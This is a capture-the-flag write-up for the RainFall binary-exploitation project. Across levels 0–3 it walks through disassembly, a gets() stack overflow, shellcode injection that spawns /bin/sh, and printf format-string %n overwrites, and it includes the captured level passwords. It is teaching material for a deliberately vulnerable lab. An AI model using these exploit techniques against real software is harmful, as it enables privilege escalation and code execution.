# RainFall

```bash
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun
```

2nd security project of the 42 cursus, focused on binary exploitation

#### - [Subject pdf 🇫🇷](https://cdn.intra.42.fr/pdf/pdf/9514/fr.subject.pdf)

#### - [Download ISO](https://projects.intra.42.fr/uploads/document/document/331/RainFall.iso)

The user/password to log for the 1st level will be `level0`/`level0`

## Level0

- [objdump -d output]()

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048ec0 <+0>:	push   %ebp
   0x08048ec1 <+1>:	mov    %esp,%ebp
   0x08048ec3 <+3>:	and    $0xfffffff0,%esp
   0x08048ec6 <+6>:	sub    $0x20,%esp
   0x08048ec9 <+9>:	mov    0xc(%ebp),%eax
   0x08048ecc <+12>:	add    $0x4,%eax
   0x08048ecf <+15>:	mov    (%eax),%eax
   0x08048ed1 <+17>:	mov    %eax,(%esp)
   0x08048ed4 <+20>:	call   0x8049710 <atoi>
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax
   0x08048ede <+30>:	jne    0x8048f58 <main+152>
   0x08048ee0 <+32>:	movl   $0x80c5348,(%esp)
   0x08048ee7 <+39>:	call   0x8050bf0 <strdup>
   0x08048eec <+44>:	mov    %eax,0x10(%esp)
   0x08048ef0 <+48>:	movl   $0x0,0x14(%esp)
   0x08048ef8 <+56>:	call   0x8054680 <getegid>
   0x08048efd <+61>:	mov    %eax,0x1c(%esp)
   0x08048f01 <+65>:	call   0x8054670 <geteuid>
   0x08048f06 <+70>:	mov    %eax,0x18(%esp)
   0x08048f0a <+74>:	mov    0x1c(%esp),%eax
   0x08048f0e <+78>:	mov    %eax,0x8(%esp)
   0x08048f12 <+82>:	mov    0x1c(%esp),%eax
   0x08048f16 <+86>:	mov    %eax,0x4(%esp)
   0x08048f1a <+90>:	mov    0x1c(%esp),%eax
   0x08048f1e <+94>:	mov    %eax,(%esp)
   0x08048f21 <+97>:	call   0x8054700 <setresgid>
   0x08048f26 <+102>:	mov    0x18(%esp),%eax
   0x08048f2a <+106>:	mov    %eax,0x8(%esp)
   0x08048f2e <+110>:	mov    0x18(%esp),%eax
   0x08048f32 <+114>:	mov    %eax,0x4(%esp)
   0x08048f36 <+118>:	mov    0x18(%esp),%eax
   0x08048f3a <+122>:	mov    %eax,(%esp)
   0x08048f3d <+125>:	call   0x8054690 <setresuid>
   0x08048f42 <+130>:	lea    0x10(%esp),%eax
   0x08048f46 <+134>:	mov    %eax,0x4(%esp)
   0x08048f4a <+138>:	movl   $0x80c5348,(%esp)
   0x08048f51 <+145>:	call   0x8054640 <execv>
   0x08048f56 <+150>:	jmp    0x8048f80 <main+192>
   0x08048f58 <+152>:	mov    0x80ee170,%eax
   0x08048f5d <+157>:	mov    %eax,%edx
   0x08048f5f <+159>:	mov    $0x80c5350,%eax
   0x08048f64 <+164>:	mov    %edx,0xc(%esp)
   0x08048f68 <+168>:	movl   $0x5,0x8(%esp)
   0x08048f70 <+176>:	movl   $0x1,0x4(%esp)
   0x08048f78 <+184>:	mov    %eax,(%esp)
   0x08048f7b <+187>:	call   0x804a230 <fwrite>
   0x08048f80 <+192>:	mov    $0x0,%eax
   0x08048f85 <+197>:	leave
   0x08048f86 <+198>:	ret
End of assembler dump.
```

### Equivalent C source code

### Walkthrough

```bash
level0@RainFall:~$ ./level0
Segmentation fault (core dumped)

level0@RainFall:~$ ./level0 1
No !
```

```bash
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax ; Compare eax to 423
```

```bash
level0@RainFall:~$ ./level0 423
$ whoami
level1
```

```bash
level0@RainFall:~$ ./level0 423
$ bash
bash: /home/user/level0/.bashrc: Permission denied
level1@RainFall:~$ cd /home/user/level1
level1@RainFall:/home/user/level1$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

level1@RainFall:/home/user/level1$ cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

## Level1

- [`objdump -d` output](http://ix.io/2bqM)

### ASM Interpretation

### Equivalent C source code

### Walkthrough

- [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)

```bash
evel1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp ; Reserve 50 bytes on the stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp) ; Load $esp address in $eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt> ; call gets with the buffer address to the stack
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

```bash
level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456'
Illegal instruction (core dumped)

level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 12345'
```

When running `objdump -d ./level1`, a `run` function using `system()` is showing.

When trying to run it in gdb, the function spawns a shell

```bash
level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) break *0x0804848d
Breakpoint 1 at 0x804848d

(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x0804848d in main ()
(gdb) set $eip = 0x^CQuit

(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xbffff774       -1073744012
edx            0xbffff704       -1073744124
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff680       0xbffff680
ebp            0xbffff6d8       0xbffff6d8
esi            0x0      0
edi            0x0      0
eip            0x804848d        0x804848d <main+13>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) set $eip = 0x8048444

(gdb) continue
Continuing.
Good... Wait what?
$ whoami
level1
```

#### Overwriting $EIP

- [Example tutorial](https://www.go4expert.com/articles/stack-overflow-eip-overwrite-basics-t24917/)

When giving a long string as arguments, we can see we can overwrite the $eip register

```bash
(gdb) run <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
Starting program: /home/user/level1/level1 <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xb7fd28c4       -1208145724
edx            0xbffff690       -1073744240
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6e0       0xbffff6e0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

The next step is to try to overwrite `$eip` with the address of the `run` function found in the binary previously

```bash
# The first 4 bytes are for $ebp and the other 4 for $eip
level1@RainFall:~$ ./level1  <<< `perl -e 'print "A"x72'`$(echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8")
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ perl -e 'print "A"x72' > /tmp/lol

level1@RainFall:~$ echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8" >> /tmp/lol

level1@RainFall:~$ cat /tmp/lol  | ./level1 
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ cat /tmp/lol - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

- [Stack base overflow tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

Some image of what we're doing here, replace `strcpy()` by `gets()`

![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)

![](https://camo.githubusercontent.com/3862e2874666eb632fad1ab3f16b420b3c558344/68747470733a2f2f692e696d6775722e636f6d2f527868674459762e706e67)

- (https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html)
    
## Level2

- [`objdump -d` output]()

### ASM Interpretation

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```bash
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp ; ASM Prologue
   0x080484d5 <+1>:     mov    ebp,esp ; ASM Prologue
   0x080484d7 <+3>:     sub    esp,0x68 ; Allocates 104 bytes on the stack
   0x080484da <+6>:     mov    eax,ds:0x8049860 ; x/100x 0x8049860 -> 0x8049860 <stdout@@GLIBC_2.0> (take stdout fileno from data segment https://stackoverflow.com/questions/30050527/meaning-of-ds-in-assembly-language)
   0x080484df <+11>:    mov    DWORD PTR [esp],eax ; set 1st argument of fflush() to *eax (STDOUT_FILENO)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> ; fflush(STDOUT_FILENO);
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c] ; Point eax to (ebp - 76) (28nth byte of the stack)
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax ; Save eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt> ; Call gets(ebp - 0x4c)
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4] ; Set eax to return value of gets()
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as the return value of gets()
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc] ; Set eax as 92nth byte of the stack
   0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask (eax & 0xb0000000)
   0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is >= '0xb0' && < '0xc0'
   0x08048505 <+49>:    jne    0x8048527 <p+83> ; If it\'s the case continue, print the string w/ printf() & exit, else goto <p+83>

   0x08048507 <+51>:    mov    eax,0x8048620 ; gdb$ printf "%s", 0x8048620 -> "(%p)"
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc] ; Set the 92nth byte of the stack as edx
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx ; Set edx as 2nd argument
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax ; Set eax as 1st argument
   0x08048516 <+66>:    call   0x80483a0 <printf@plt> ; Call printf("(%p)", ebp-0xc (ebp - 12 / 92th byte));
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit()
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> ; Call exit()

   0x08048527 <+83>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax ; Set 1st argument of puts to eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt> ; Call puts(ebp-0x4c)
   0x08048532 <+94>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax ; Set 1st argument of strdup() to eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> ; Call strdup()

   0x0804853d <+105>:   leave ; ASM Epilogue
   0x0804853e <+106>:   ret ; ASM Epilogue
End of assembler dump.
```

### Equivalent C source code


### Walkthrough
As we can see we're storing the output of gets() in to pointer to the 28h byte of the stack, which has a size limited to 104 bytes

It's also important to note that we're executing printf("%p") instead of puts() & strdup() when the 92th byte of the stack is between 0xb0 and 0xbf

Let's try to run this printf:

```bash
# To write what we want to the 92th byte of the stack, keep in mind that we're starting to write with gets() at index 28
# To reach the end of our buffer we should then pass a string with a length of 76
# EBP and EIP of the main() frame will be 4 bytes each, so to override both of them, we should pass (76 + 2*4) bytes
# 

level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" | wc -c
84

level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" > /tmp/lol

level2@RainFall:~$ xxd /tmp/lol
0000000: 6162 6364 6566 6768 696a 6b6c 6d6e 6f70  abcdefghijklmnop
0000010: 7172 7374 7576 7778 797a 3031 3233 3435  qrstuvwxyz012345
0000020: 3637 3839 6162 6364 6566 6768 696a 6b6c  6789abcdefghijkl
0000030: 6d6e 6f70 7172 7374 7576 7778 797a 3031  mnopqrstuvwxyz01
0000040: 3233 3435 3637 3839 6162 6364 6566 6768  23456789abcdefgh
0000050: 696a 6bb0                                ijk.
```

```bash
level2@RainFall:~$ gdb ./level2
gdb-peda$ b *0x080484f2 # (After puts() call in p())

gdb-peda$ run < /tmp/lol

gdb-peda$ print $ebp
$1 = (void *) 0xbffff6c8

# $ebp - 4c = 0xbffff67d
gdb-peda$ printf "%s", 0xbffff67d
abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk
```

We're hitting the printf() call !

```bash
level2@RainFall:~$ cat /tmp/lol  - | ./level2
(0xb06b6a69)

level2@RainFall:~$ echo $?
1
```

Let's grab a random shellcode from the internet...

```bash
level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\x7d\xf6\xff\xbf')" > /tmp/lol

level2@RainFall:~$ cat /tmp/lol | ./level2
(0xbffff67d)
```

Unfortunaltely, the printf in the code prevent us from executing the shellcode in our string because its address begins by `\bf` like all other addresses of the program in the stack

So I had to find something else !

When doing an `objdump -d` on the program, we can see the function `__do_global_ctors_aux` used by the kernel makes a `call` instruction to `eax` to execute something stored in it

![Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/images/callgraph.png)

```bash
080485d0 <__do_global_ctors_aux>:
 80485d0:       55                      push   %ebp
 80485d1:       89 e5                   mov    %esp,%ebp
 80485d3:       53                      push   %ebx
 80485d4:       83 ec 04                sub    $0x4,%esp
 80485d7:       a1 48 97 04 08          mov    0x8049748,%eax
 80485dc:       83 f8 ff                cmp    $0xffffffff,%eax
 80485df:       74 13                   je     80485f4 <__do_global_ctors_aux+0x24>
 80485e1:       bb 48 97 04 08          mov    $0x8049748,%ebx
 80485e6:       66 90                   xchg   %ax,%ax
 80485e8:       83 eb 04                sub    $0x4,%ebx
 80485eb:       ff d0                   call   *%eax
 80485ed:       8b 03                   mov    (%ebx),%eax
 80485ef:       83 f8 ff                cmp    $0xffffffff,%eax
 80485f2:       75 f4                   jne    80485e8 <__do_global_ctors_aux+0x18>
 80485f4:       83 c4 04                add    $0x4,%esp
 80485f7:       5b                      pop    %ebx
 80485f8:       5d                      pop    %ebp
 80485f9:       c3                      ret
 80485fa:       90                      nop
 80485fb:       90                      nop
```

I then tried to pass my shellcode in the input of the program like before, but passing the address of the `call eax` instruction in the `EIP` register instead of the address of our shellcode in the stack of the `p` function frame

```bash
level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\xeb\x85\x04\x08')" > /tmp/lol

level2@RainFall:~$ cat /tmp/lol - | ./level2
ls
1Qh//shh/binAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
ls
ls: cannot open directory .: Permission denied
whoami
level3
pwd
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Level3

- [`objdump -d` output](http://ix.io/2bMn)

### ASM Interpretation

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.

gdb-peda$ disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp ; ASM Prologue
   0x080484a5 <+1>:     mov    %esp,%ebp ; ASM Prologue

   0x080484a7 <+3>:     sub    $0x218,%esp ; Allocate 536 bytes on the stack
   0x080484ad <+9>:     mov    0x8049860,%eax ; Move stdin@@GLIBC_2.0 to eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp) ; Move stdin@@GLIBC_2.0 as 3rd argument of fgets()
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp) ; Move 512 as 2nd argument of fgets()
   0x080484be <+26>:    lea    -0x208(%ebp),%eax ; Set eax to point to the (520th / 16th last) byte of the stack
   0x080484c4 <+32>:    mov    %eax,(%esp) ; Set eax as 1st argument of fgets()
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt> ; Call fgets(ebp - 520, 512, stdin)
    ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax ; Set eax to point to the 16th byte of the stack
   0x080484d2 <+46>:    mov    %eax,(%esp) ; Set eax as 1st argument of printf()
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
   0x080484e2 <+62>:    jne    0x8048518 <v+116> ; If it\'s not the case, goto v+116 (return)

   0x080484e4 <+64>:    mov    0x8049880,%eax ; Set eax to stdout@@GLIBC_2.0
   0x080484e9 <+69>:    mov    %eax,%edx ; Set eax as 3rd argument of fwrite
   0x080484eb <+71>:    mov    $0x8048600,%eax ; Set eax to 0x8048600 printf "%s", 0x8048600 -> "Wait what?!"
   0x080484f0 <+76>:    mov    %edx,0xc(%esp) ; Set stdout@@GLIBC_2.0 as 4th argument
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp) ; Set 3rd argument to 12
   0x080484fc <+88>:    movl   $0x1,0x4(%esp) ; Set 2nd argument to 1
   0x08048504 <+96>:    mov    %eax,(%esp) ; Set eax as 1st argument
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt> ; fwrite(stdout, 1, 12);
    ;      size_t fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream);
   0x0804850c <+104>:   movl   $0x804860d,(%esp) ; Set 1st argument of system() to "/bin/sh": printf "%s", 0x804860d -> /bin/sh
   0x08048513 <+111>:   call   0x80483c0 <system@plt> ; Call system("/bin/sh")

   0x08048518 <+116>:   leave ; ASM Epilogue
   0x08048519 <+117>:   ret ; ASM Epilogue
End of assembler dump.

gdb-peda$ disas 0x8049860
Dump of assembler code for function stdin@@GLIBC_2.0:
   0x08049860 <+0>:     add    %al,(%eax)
   0x08049862 <+2>:     add    %al,(%eax)
End of assembler dump.

gdb-peda$ disas 0x8049880
Dump of assembler code for function stdout@@GLIBC_2.0:
   0x08049880 <+0>:     add    %al,(%eax)
   0x08049882 <+2>:     add    %al,(%eax)
End of assembler dump.
```

### Equivalent C source code

```cpp
// level3@RainFall:~$ cat /tmp/lol.c
#include <stdio.h>

# define m 0

void    v(void) {
        unsigned char buf[536];

        fgets(buf + 520, 512, stdin);
        printf(buf + 520);
        if (m == 0x40)
        {
                fwrite("Wait what?!\n", 1, 12, stdout);
                system("/bin/sh");
        }
        return ;
}

int     main(void) {
        v();
        return (0);
}
```

### Walkthrough

```bash
level3@RainFall:~$ ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

level3@RainFall:~$ ./level3
%p
0x200
```

- [Printf vulns example](https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail)

```bash
level3@RainFall:~$ ./level3 <<< '%x %x %x %x %x'
200 b7fd1ac0 b7ff37d0 25207825 78252078

level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x'
AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242

level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x %x'
AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242 43434343
```

```bash
level3@RainFall:~$ ./level3 <<< 'AAAA %4$x'
AAAA 41414141

level3@RainFall:~$ ./level3 <<< 'AAAA %4$s'
Segmentation fault (core dumped)
```

We can read our own string !

#### Overwriting m

```bash
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
[0x0804988c  m]
```

```bash
(gdb) print "%u", *0x804988c
$3 = 0
```

```bash
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
```

```bash
level3@RainFall:~$ echo -n -e '\x0d\x86\x04\x08%4$s' > /tmp/input; ./level3  < /tmp/input | xxd
0000000: 0d86 0408 2f62 696e 2f73 68              ..../bin/sh
```

```bash
level3@RainFall:~$ echo -n -e '\x8c\x98\x04\x08''%60x%4$n' > /tmp/input

level3@RainFall:~$ cat /tmp/input - | ./level3
ls
�                                                         200ls
Wait what?!
ls
ls: cannot open directory .: Permission denied
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

#### Rewriting EIP attempt

```bash
level3@RainFall:~$ python -c "print 'A'*4" > /tmp/input; cat /tmp/input
AAAA

level3@RainFall:~$ gdb ./level3
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
(gdb) b *0x08048520
Breakpoint 1 at 0x8048520
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   ...
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   ...
   0x08048519 <+117>:   ret
End of assembler dump.
(gdb) b *0x080484cc
Breakpoint 2 at 0x80484cc
(gdb) run  < /tmp/input

(gdb) run  < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Breakpoint 1, 0x08048520 in main ()
(gdb) i r
eax            0x1      1
ecx            0xbffff744       -1073744060
....
esi            0x0      0
edi            0x0      0
[eip            0x8048520        0x8048520 <main+6>]

(gdb) continue

(gdb) find $esp,0xbfffffff,0x08048525
0xbffff69c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x41414141
0xbffff490
1 pattern found.
```

Now let's try to find saved eip from main() for fun:

```bash
level3@RainFall:~$ for i in $(seq 1 10); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;
1: 200
2: b7fd1ac0
3: b7ff37d0
4: 2434255c
5: b7e20078
6: 1
7: b7fef305
8: bffff518
9: b7fde2d4
10: b7fde334

# Not there ... let's try with a bigger range
level3@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;) | grep 8048525
135: 8048525
```

To make the program run the if() condition containing the system() call, we'll try to rewrite a saved EIP pointer,

To do this we can try to make the program segfault, look at the backtrace (where function calls happened) and try to rewrite these addresses in the memory of the program

```bash
level3@RainFall:~$ echo -n -e 'AAAA%4$x'> /tmp/input ; cat /tmp/input  | ./level3
AAAA41414141

level3@RainFall:~$ echo -n -e 'AAAA%4$s' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x080484da in v ()
#3  0x08048525 in main ()

(gdb) find $esp,0xbfffffff,0xb7e70003
Pattern not found.

(gdb) find $esp,0xbfffffff,0xb7e7887f
0xbffff45c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x080484da
0xbffff47c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x08048525
0xbffff69c
1 pattern found.
```

Now that we have the locations of the saved EIP pointers, let's try to rewrite one using the `%n` feature of printf (which saves the number of printed characters to the passed argument)

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf%4$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

Bingo! The address got overwritten, now let's write the address that we want to jump to, `0x080484e4`

`0x080484e4` == `134513892`, -4 for first 4 bytes

Although it may work, we don't have to write this much bytes to overwrite EIP with the value we want

We can instead use multiple `%n` values with the address of each byte in the 4byte address integer

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x0000001a in ?? ()

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n''%10x%5$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x0000241a in ?? ()
```

```bash
